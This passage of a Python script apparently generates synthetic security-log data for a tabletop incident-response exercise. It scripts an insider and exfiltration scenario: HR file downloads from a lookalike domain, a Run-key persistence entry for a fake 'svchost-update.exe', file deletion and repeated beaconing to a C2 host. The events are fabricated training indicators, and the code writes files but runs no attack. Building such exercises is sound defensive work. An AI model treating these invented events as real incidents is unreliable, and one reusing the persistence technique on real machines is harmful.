        (145,"CloudAppEvents",dict(AccountId="hradvisor@rnicrosoft.com",AccountDisplayName="HR Advisor",Application="Microsoft SharePoint Online",ActionType="FileDownloaded",ObjectName="hr_personal.7z",ObjectType="File",IPAddress="203.0.113.44",CountryCode="CN",IsExternalUser="true")),
        (155,"CloudAppEvents",dict(AccountId=LOUISE,Application="Microsoft OneDrive",ActionType="FileSyncBlocked",ObjectName="hr_personal.7z",AdditionalFields=json.dumps({"destination":"craiglonn personal OneDrive","policy":"External cloud storage block"}))),
        (165,"DeviceNetworkEvents",dict(DeviceId="dev-net-adm-017",DeviceName="NET-ADM-017",ActionType="ConnectionSuccess",RemoteIP="198.51.100.200",RemotePort="443",RemoteUrl="indicator-validation.example",Protocol="Tcp",InitiatingProcessFileName="indicator-test.exe",InitiatingProcessAccountUpn="damo.tom@creditsafe.com")),
        (190,"DeviceRegistryEvents",dict(ActionType="RegistryValueSet",DeviceId="dev-ll-042",DeviceName=DEVICE,InitiatingProcessAccountUpn=LOUISE,InitiatingProcessFileName="svchost-update.exe",RegistryKey="HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",RegistryValueName="OneDrive Update",RegistryValueData="C:\\Users\\Louise.Lonn\\AppData\\Roaming\\Microsoft\\svchost-update.exe")),
        (200,"DeviceFileEvents",dict(ActionType="FileDeleted",DeviceId="dev-ll-042",DeviceName=DEVICE,FileName="hr_personal.7z",FolderPath="C:\\Users\\Louise.Lonn\\AppData\\Local\\Temp",InitiatingProcessAccountUpn=LOUISE,InitiatingProcessFileName="svchost-update.exe")),
    ]
    for minute, table, values in day_events:
        values.setdefault("TimeGenerated",stamp(DAY+timedelta(minutes=minute)))
        if "Timestamp" in {c["name"] for c in schemas[table]}: values.setdefault("Timestamp",stamp(DAY+timedelta(minutes=minute)))
        add(rows,minute*60,table,record(schemas,table,**values))

    for number in range(1,51):
        minute=35+(45*number/50)
        when=DAY+timedelta(minutes=minute)
        values=dict(TimeGenerated=stamp(when),Timestamp=stamp(when),AccountId=LOUISE,AccountDisplayName="Louise Lonn",Application="Microsoft SharePoint Online",ActionType="FileDownloaded",ObjectName=f"HR_Employee_{number:03}.docx",ObjectType="File",IPAddress="203.0.113.44",CountryCode="CN")
        add(rows,int(minute*60),"CloudAppEvents",record(schemas,"CloudAppEvents",**values))
    for number in range(427):
        when=DAY+timedelta(minutes=5,seconds=number*5)
        add(rows,45*60,"EmailEvents",record(schemas,"EmailEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),NetworkMessageId=f"sales-campaign-{number:04}",SenderFromAddress="olivia.mercer@creditsafe.com",SenderFromDomain="creditsafe.com",RecipientEmailAddress=f"prospect{number:04}@customer.example",Subject="Creditsafe customer update",DeliveryAction="Delivered",DeliveryLocation="Inbox",EmailDirection="Outbound",Connectors="Dynamics 365 Sales",ThreatTypes="",UrlCount="1"))
    for second in range(160*60,190*60,10):
        when=DAY+timedelta(seconds=second)
        add(rows,second,"DeviceNetworkEvents",record(schemas,"DeviceNetworkEvents",TimeGenerated=stamp(when),Timestamp=stamp(when),DeviceId="dev-ll-042",DeviceName=DEVICE,ActionType="ConnectionSuccess",RemoteIP=C2,RemotePort="443",RemoteUrl="aeifile.offiec.us.kg",Protocol="Tcp",InitiatingProcessFileName="svchost-update.exe",InitiatingProcessAccountUpn=LOUISE))
    return rows


def write_build(output):
    schemas=load_schemas(); batches=build_rows(schemas); output.mkdir(parents=True,exist_ok=True); manifest={"version":2,"database":"TabletopSIEM","schemas":schemas,"batches":[]}
    for (offset,table),items in sorted(batches.items()):
        items=sorted(items,key=lambda item:item.get("TimeGenerated") or item.get("Timestamp") or "")
        folder=output/("historical" if offset<0 else f"scheduled/t{offset:05}"); folder.mkdir(parents=True,exist_ok=True); path=folder/f"{table}.csv"; columns=[c["name"] for c in schemas[table]]
        with path.open("w",encoding="utf-8",newline="") as handle:
            writer=csv.DictWriter(handle,fieldnames=columns,extrasaction="raise",lineterminator="\n"); writer.writerows(items)
        file_hash=hashlib.sha256(path.read_bytes()).hexdigest()
        batch_id=hashlib.sha256(f"{offset}:{table}:{file_hash}".encode()).hexdigest()[:16]
        manifest["batches"].append({"id":batch_id,"offset_seconds":offset,"table":table,"rows":len(items),"path":path.relative_to(output).as_posix(),"sha256":file_hash})
    (output/"manifest.json").write_text(json.dumps(manifest,indent=2),encoding="utf-8")
    return manifest


if __name__=="__main__":
    parser=argparse.ArgumentParser(); parser.add_argument("--output",type=Path,default=ROOT/"generated"); args=parser.parse_args(); built=write_build(args.output.resolve()); print(f"Built {sum(b['rows'] for b in built['batches'])} rows in {len(built['batches'])} batches at {args.output.resolve()}")
